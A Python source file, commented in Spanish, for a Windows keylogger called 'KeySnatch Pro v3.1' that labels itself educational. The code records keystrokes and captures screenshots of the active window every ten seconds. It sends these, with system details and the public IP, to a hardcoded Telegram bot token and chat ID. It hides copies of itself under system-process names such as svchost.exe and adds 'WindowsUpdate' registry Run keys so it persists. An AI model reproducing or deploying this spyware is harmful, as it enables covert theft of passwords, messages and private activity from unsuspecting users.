#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Keylogger Educativo Avanzado - KeySnatch Pro v3.1
------------------------------------------------
VERSIÓN COMPLETA Y FUNCIONAL CON:
- Registro de teclado confiable
- Capturas de pantalla periódicas
- Envío seguro a Telegram
- Persistencia en Windows
- Sistema de parada mejorado
- Cifrado opcional
"""

import os
import sys
import time
import threading
import platform
import subprocess
import shutil
import base64
import random
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime
import psutil
from pynput.keyboard import Key, Listener
import pyautogui
import win32api
import win32con
import win32gui
import winreg
import requests
from PIL import Image
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ==================== CONFIGURACIÓN ====================
TOKEN = '7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is'  # Obtener de @BotFather
CHAT_ID = '5719356323'       # Obtener con @userinfobot

# Intervalos (en segundos)
INTERVALO_REPORTE = 10      # Envío de logs
INTERVALO_CAPTURAS = 10      # Capturas de pantalla
MAX_LOG_SIZE = 10000         # Máximo caracteres antes de enviar

# Configuración de cifrado (opcional)
SALT = b'KeySnatch_Salt_123'
PASSWORD = b'EducativeKeyloggerPassword123!'

# ==================== INICIALIZACIÓN ====================
# Configuración de logging
def configurar_logging():
    try:
        log_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Logs')
        os.makedirs(log_dir, exist_ok=True)
        win32api.SetFileAttributes(log_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                RotatingFileHandler(
                    os.path.join(log_dir, 'wlms.log'),
                    maxBytes=100000,
                    backupCount=3
                )
            ]
        )
    except Exception as e:
        print(f"Error configurando logging: {str(e)}")

configurar_logging()

# Variables globales
log = ""
detener = False
ctrl_presionado = False
alt_presionado = False
k_presionado = False

# ==================== FUNCIONES DE CIFRADO ====================
def generar_clave_cifrado():
    """Deriva una clave segura usando PBKDF2"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=480000,
    )
    return base64.urlsafe_b64encode(kdf.derive(PASSWORD))

cipher_suite = Fernet(generar_clave_cifrado())

# ==================== FUNCIONES DE PERSISTENCIA ====================
def establecer_persistencia():
    """Crea múltiples métodos de persistencia"""
    try:
        ubicacion_actual = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        # 1. Copia en directorio oculto
        directorio_oculto = os.path.join(os.getenv('APPDATA'), 'Windows', 'System32_Backup')
        os.makedirs(directorio_oculto, exist_ok=True)
        win32api.SetFileAttributes(directorio_oculto, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        nombre_exe = random.choice(['svchost.exe', 'lsass.exe', 'dllhost.exe'])
        destino = os.path.join(directorio_oculto, nombre_exe)
        
        if not os.path.exists(destino):
            shutil.copy2(ubicacion_actual, destino)
            
            # 2. Entradas de registro
            ubicaciones_registro = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
            ]
            
            for ubicacion in ubicaciones_registro:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, ubicacion, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, destino)
                    winreg.CloseKey(key)
                except:
                    continue
                    
    except Exception as e:
        logging.error(f"Error en persistencia: {str(e)}")

# ==================== FUNCIONES DE CAPTURA ====================
def on_press(key):
    global log, ctrl_presionado, alt_presionado, k_presionado, detener
    
    try:
        # Combinación para detener (Ctrl+Alt+K)
        if key in (Key.ctrl_l, Key.ctrl_r):
            ctrl_presionado = True
        elif key in (Key.alt_l, Key.alt_r):
            alt_presionado = True
        elif hasattr(key, 'char') and key.char and key.char.lower() == 'k':
            k_presionado = True
            
        if ctrl_presionado and alt_presionado and k_presionado:
            detener = True
            return False
            
        # Registrar tecla
        if hasattr(key, 'char') and key.char:
            log += key.char
        else:
            log += f"[{key}] "
            
        # Auto-envío si el log es muy grande
        if len(log) > MAX_LOG_SIZE:
            threading.Thread(target=enviar_log).start()
            
    except Exception as e:
        logging.error(f"Error en on_press: {e}")

def on_release(key):
    global ctrl_presionado, alt_presionado, k_presionado
    try:
        if key in (Key.ctrl_l, Key.ctrl_r):
            ctrl_presionado = False
        elif key in (Key.alt_l, Key.alt_r):
            alt_presionado = False
        elif hasattr(key, 'char') and key.char and key.char.lower() == 'k':
            k_presionado = False
    except:
        pass

def capturar_ventana_activa():
    """Captura la ventana actualmente activa"""
    try:
        ventana = win32gui.GetForegroundWindow()
        titulo = win32gui.GetWindowText(ventana)
        rect = win32gui.GetWindowRect(ventana)
        x, y, w, h = rect
        captura = pyautogui.screenshot(region=(x, y, w - x, h - y))
        return captura, titulo
    except:
        return None, None

# ==================== FUNCIONES DE COMUNICACIÓN ====================
def enviar_log():
    global log
    try:
        if log:
            log_actual = log
            log = ""
            
            # Cifrado opcional (descomentar si se necesita)
            # log_actual = cipher_suite.encrypt(log_actual.encode()).decode()
            
            enviar_a_telegram(f"Registro de teclas:\n{log_actual}")
    except Exception as e:
        logging.error(f"Error enviando log: {e}")
        log = log_actual + log  # Recupera el log si falla

def enviar_a_telegram(mensaje, archivo=None):
    try:
        url = f'https://api.telegram.org/bot{TOKEN}/'
        
        if archivo:
            with open(archivo, 'rb') as f:
                response = requests.post(
                    url + 'sendPhoto',
                    data={'chat_id': CHAT_ID},
                    files={'photo': f},
                    timeout=20
                )
            os.remove(archivo)
        else:
            response = requests.post(
                url + 'sendMessage',
                data={'chat_id': CHAT_ID, 'text': mensaje[:4000]},
                timeout=10
            )
            
        if response.status_code != 200:
            logging.error(f"Error Telegram: {response.text}")
            return False
        return True
    except Exception as e:
        logging.error(f"Error enviando a Telegram: {e}")
        return False

# ==================== HILOS DE EJECUCIÓN ====================
def hilo_capturas():
    while not detener:
        try:
            captura, titulo = capturar_ventana_activa()
            if captura:
                nombre = f"captura_{int(time.time())}.jpg"
                captura.save(nombre, quality=70)
                enviar_a_telegram(f"Captura: {titulo}", nombre)
        except Exception as e:
            logging.error(f"Error en hilo_capturas: {e}")
            time.sleep(2)  # Espera más ante errores
        
        time.sleep(INTERVALO_CAPTURAS)

def hilo_reporte():
    while not detener:
        try:
            if log:
                enviar_log()
        except Exception as e:
            logging.error(f"Error en hilo_reporte: {e}")
        
        time.sleep(INTERVALO_REPORTE)

# ==================== FUNCIONES DE INFORMACIÓN ====================
def capturar_info_sistema():
    """Recoge información básica del sistema"""
    info = {
        "Usuario": os.getlogin(),
        "Hostname": platform.node(),
        "OS": platform.platform(),
        "Procesador": platform.processor(),
        "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
        "IP": requests.get('https://api.ipify.org').text,
        "Fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items())

# ==================== EJECUCIÓN PRINCIPAL ====================
if __name__ == "__main__":
    try:
        # Mostrar advertencia
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(
                0,
                "ADVERTENCIA: Keylogger educativo activo\n\n"
                "Este software está registrando actividad con fines educativos.\n"
                "Para detenerlo, presione Ctrl+Alt+K simultáneamente.",
                "Windows System Manager",
                0x40
            )
        except:
            pass
        
        # Establecer persistencia
        establecer_persistencia()
        
        # Enviar información del sistema al inicio
        enviar_a_telegram("[SYSTEM INFO]\n" + capturar_info_sistema())
        
        # Iniciar hilos
        threading.Thread(target=hilo_capturas, daemon=True).start()
        threading.Thread(target=hilo_reporte, daemon=True).start()
        
        # Listener de teclado
        with Listener(on_press=on_press, on_release=on_release) as listener:
            while not detener:
                time.sleep(1)
            listener.stop()
            
    except Exception as e:
        logging.critical(f"Error crítico: {e}")
    finally:
        logging.info("Keylogger detenido")
        os._exit(0)
